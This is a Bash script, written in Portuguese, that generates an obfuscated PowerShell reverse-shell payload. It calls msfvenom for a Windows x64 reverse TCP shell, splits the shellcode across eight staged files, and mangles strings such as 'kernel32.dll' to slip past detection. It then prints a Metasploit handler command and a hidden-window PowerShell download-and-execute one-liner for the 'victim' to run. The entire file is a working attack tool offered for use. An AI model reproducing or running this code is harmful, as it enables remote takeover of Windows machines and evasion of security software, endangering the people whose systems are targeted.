#!/bin/bash
clear
echo "########################################"
echo "#                                      #"
echo "#  GERADOR DE PAYLOAD EM POWERSHELL    #"
echo "#                                      #"
echo "########################################"

echo ""

dir="tmp"
if [[ ! -e $dir ]]; then
    mkdir $dir
elif [[ ! -d $dir ]]; then
    rm tmp/*
fi

read -p "Insira o endereço do atacante para conexao reversa [192.168.25.9]: " ip
ip=${ip:-192.168.25.9}
read -p "Insira a porta [443]: " porta
porta=${porta:-443}
read -p "Insira a URL: [http://$ip/shell.txt]: " url
url=${url:-http://$ip/shell.txt}
echo ""

echo "Gerando shellcode com o msfvenom. Aguarde... "
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$porta -f psh -o tmp/shellcode  > /dev/null 2> /dev/null
echo ""

url=$(echo $url | sed "s/http/ht'+'tp/g" | sed "s/:\//:'+'\/'+'/g" | sed "s/\./'+'\.'+'/g")

url_base=$(echo $url | grep -o '^.*/')

echo "IEX((new-object net.webclient).downloadstring('$url_base""s1.txt'));" > tmp/shell.txt
echo "Start-Sleep -milliseconds 1000" >> tmp/shell.txt
echo "IEX((new-object net.webclient).downloadstring('$url_base""s2.txt'));" >> tmp/shell.txt
echo "Start-Sleep -milliseconds 1000" >> tmp/shell.txt
echo "IEX((new-object net.webclient).downloadstring('$url_base""s3.txt'));" >> tmp/shell.txt
echo "Start-Sleep -milliseconds 5000" >> tmp/shell.txt
echo "IEX((new-object net.webclient).downloadstring('$url_base""s4.txt'));" >> tmp/shell.txt
echo "Start-Sleep -milliseconds 5000" >> tmp/shell.txt
echo "IEX((new-object net.webclient).downloadstring('$url_base""s5.txt'));" >> tmp/shell.txt
echo "Start-Sleep -milliseconds 5000" >> tmp/shell.txt
echo "IEX((new-object net.webclient).downloadstring('$url_base""s6.txt'));" >> tmp/shell.txt
echo "Start-Sleep -milliseconds 1000" >> tmp/shell.txt
echo "IEX((new-object net.webclient).downloadstring('$url_base""s7.txt'));" >> tmp/shell.txt
echo "Start-Sleep -milliseconds 1000" >> tmp/shell.txt
echo "IEX((new-object net.webclient).downloadstring('$url_base""s8.txt'));" >> tmp/shell.txt

head -6 tmp/shellcode | sed 's/kernel32.dll/ke"+"rnel"+"32."+"d"+"ll/g' > tmp/s1.txt

cat tmp/shellcode | grep "Win32Functions" > tmp/s2.txt

var=$(cat tmp/shellcode | grep "[Byte[]]" | cut -d" " -f2)

shellcode=$(cat tmp/shellcode | grep "[Byte[]]" | cut -d" " -f4)

IFS=', ' read -r -a array <<< "$shellcode"
total="${#array[@]}"

echo "Total de $total"
echo ""
parte1=$(expr $total / 3)
parte2=$(expr $parte1 \* 2)

s1="[Byte[]] $var = "
s2="$var += "
s3="$var += "

for index in "${!array[@]}"
do
	if [ $index -lt $parte1 ];
	then
		s1+="${array[index]},"
	elif [ $index -lt $parte2  ];
	then
		s2+="${array[index]},"
	else
		s3+="${array[index]},"
	fi
done

# Tira a virgula do final
s1="${s1::-1}"
echo $s1 > tmp/s3.txt

# Tira a virgula do final
s2="${s2::-1}"
echo $s2 > tmp/s4.txt

# Tira a virgula do final
s3="${s3::-1}"
echo $s3 > tmp/s5.txt

cat tmp/shellcode | grep "::VirtualAlloc" > tmp/s6.txt
cat tmp/shellcode | grep "System.Runtime.InteropServices.Marshal" > tmp/s7.txt
cat tmp/shellcode | grep "::CreateThread" > tmp/s8.txt

echo ""
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'
printf "Processo finalizado! os arquivos ${RED}shell.txt, s1.txt, s2.txt, s3.txt, s4.txt, s5.txt, s6.txt, s7.txt e s8.txt${NC} foram gerados nodiretório ${RED}tmp${NC}. Você deve subir esses arquivos em algum servidor WEB acessível pela vitima.\n"
printf "O arquivo ${RED}shell.txt${NC} ira carregar os demais arquivos.\n"
echo ""
echo "Inicie o metasploist no atacante com esse comando: "
printf "${RED}msfconsole -x \"use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set lhost $ip; set lport $porta; set exitonsession false; exploit -j;\"${NC}"
echo ""
echo ""
echo "A vitima deve executar o seguinte comando (em um ambiente com proxy, desabilite para teste local): "
printf "${RED}powershell -windowstyle hidden -C \"IEX((new-object net.webclient).downloadstring('$url'));\"${NC}"

rm tmp/shellcode
